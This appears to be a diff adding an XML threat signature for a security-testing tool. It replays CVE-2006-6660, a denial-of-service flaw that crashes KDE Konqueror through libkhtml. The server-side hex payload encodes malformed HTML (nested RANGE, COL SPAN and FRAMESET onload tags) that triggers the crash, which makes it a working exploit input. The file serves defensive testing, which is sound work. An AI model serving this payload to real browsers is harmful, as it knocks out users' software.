@@ -1,0 +1,88 @@
+<?xml version="1.0" encoding="utf-8"?>
+<threatSignature>
+  <ThreatProperties>
+    <ExecDesc display="true" value="KDE 3.5 | libkhtml &lt;= 4.2.0 / Unhandled HTML Parse Exception"/>
+    <EngDesc display="true" value="This threat crashes any program using the libkhtml library via malformed HTML tags. Libkhtml is a library used by applications such as the Konqueror Web Browser and the Kmail Email client. This threat targets the Konqueror web browser that typically connects to web servers listening on port 80."/>
+    <Intent display="true">
+      <item value="Denial_of_Service"/>
+    </Intent>
+    <Protocol display="true" value="HTTP"/>
+    <Type_Of_Equipment display="true">
+      <item value="Web_Browser"/>
+    </Type_Of_Equipment>
+    <Known_Vendors_Affected display="true">
+      <item value="KDE"/>
+    </Known_Vendors_Affected>
+    <Known_Products_Affected display="true">
+      <item value="KDE_Konqueror"/>
+    </Known_Products_Affected>
+    <Known_Versions_Affected display="true">
+      <item value="KDE_Konqueror_3.5.2"/>
+    </Known_Versions_Affected>
+    <Credit display="true" value="http://www.milw0rm.com/exploits/2954"/>
+    <CVEID display="true" value="CVE-2006-6660"/>
+    <bugtraqID display="true" value="21662"/>
+    <OSVDB display="true" value=""/>
+    <Author display="true" value="Mike Davis"/>
+    <ID display="true" value="17c28c05ad3ffb8f1bf8f13d23a992f3"/>
+    <Revision display="true" value="1"/>
+    <Safe display="true" value="true"/>
+    <ServerSideAttack display="true" value="false"/>
+    <SoftwareRevision display="true" value="2.0"/>
+    <Suite display="true" value="Standard"/>
+    <RunOnce display="false" value="false"/>
+    <Valid_Traffic display="false" value="true"/>
+    <AccessVector display="false" value="remote"/>
+    <AccessComplexity display="false" value="low"/>
+    <Authentication display="false" value="not-required"/>
+    <ConfImpact display="false" value="none"/>
+    <IntegImpact display="false" value="none"/>
+    <AvailImpact display="false" value="complete"/>
+    <ImpactBias display="false" value="availability"/>
+    <FirstAdded display="false" value=""/>
+    <LastModified display="false" value="633023487870312500"/>
+    <SigStyle display="false" value=""/>
+    <targetNode display="false" value=""/>
+    <SigProtocol display="false" value=""/>
+    <Rate display="false" value=""/>
+    <Regex display="false" value=""/>
+    <Created value="1167944317" display="true"/>
+  </ThreatProperties>
+  <Variables>
+    <NamedVar name="sourceMAC" type="ImperfectControls.MacAddress" value="null" index="C"/>
+    <NamedVar name="destMAC" type="ImperfectControls.MacAddress" value="null" index="D"/>
+    <NamedVar name="sourceIP" type="ImperfectControls.IPv4Address" value="null" index="E"/>
+    <NamedVar name="destIP" type="ImperfectControls.IPv4Address" value="null" index="F"/>
+    <NamedVar name="HTTPdestPort" type="ImperfectControls.Port" value="null" index="G"/>
+  </Variables>
+  <Loops>
+    <for index="A">
+      <for index="C"/>
+      <for index="D"/>
+      <for index="E"/>
+      <for index="F"/>
+      <for index="G"/>
+    </for>
+    <for index="B"/>
+  </Loops>
+  <PostScript/>
+  <Output index="A" Count="">
+    <Ethernet srcMac="$sourceMAC" destMac="$destMAC" pktType="0800">
+      <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="$sourceIP" destIP="$destIP" options="" CE="" DF="" MF="">
+        <TCP srcPort="@random(1026,65535)" destPort="$HTTPdestPort" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="474554202F20485454502F312E310D0A557365722D4167656E743A204D6F7A696C6C612F352E302028636F6D70617469626C653B204B6F6E717565726F722F332E353B204C696E757829204B48544D4C2F332E352E3220286C696B65204765636B6F290D0A4163636570743A20746578742F68746D6C2C20696D6167652F6A7065672C20696D6167652F706E672C20746578742F2A2C20696D6167652F2A2C202A2F2A0D0A4163636570742D456E636F64696E673A20782D677A69702C20782D6465666C6174652C20677A69702C206465666C6174650D0A4163636570742D436861727365743A2069736F2D383835392D312C207574662D383B713D302E352C202A3B713D302E350D0A4163636570742D4C616E67756167653A20656E0D0A486F73743A207777772E736974652E636F6D0D0A436F6E6E656374696F6E3A204B6565702D416C697665" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+      </IP>
+    </Ethernet>
+  </Output>
+  <Input>
+    <Ethernet/>
+  </Input>
+  <ServerSide display="1">
+    <Output index="B" Count="">
+      <Ethernet srcMac="" destMac="" pktType="0800">
+        <IP Version="4" InternetHeaderLength="" TypeofService="" TotalLength="" Identification="" FragmentOffset="" TTL="" Protocol="06" HeaderChecksum="" srcIP="" destIP="" options="" CE="" DF="" MF="">
+          <TCP srcPort="" destPort="" SeqNumber="" AckNumber="" HeaderLength="" WindowSize="" Checksum="" UrgentPointer="" Options="" Payload="485454502F312E3120333034204E6F74204D6F6469666965640D0A446174653A205468752C2032312044656320323030362031383A33303A333620474D540D0A5365727665723A204170616368650D0A436F6E6E656374696F6E3A20636C6F73650D0A455461673A20223233343036352D3134312D34313864354445414442454546220D0A0D0A3C48544D4C3E0D0A3C484541443E0D0A3C52414E4745203C434F4C205350414E203C3E3E3E0D0A3C4652414D45534554206F6E6C6F6164203E0D0A3C2F484541443E0D0A3C2F48544D4C3E" CWR="" ECE="" URG="" ACK="" PSH="" RST="" SYN="" FIN="" RES1="" RES2="" RES3="" RES4=""/>
+        </IP>
+      </Ethernet>
+    </Output>
+  </ServerSide>
+</threatSignature>
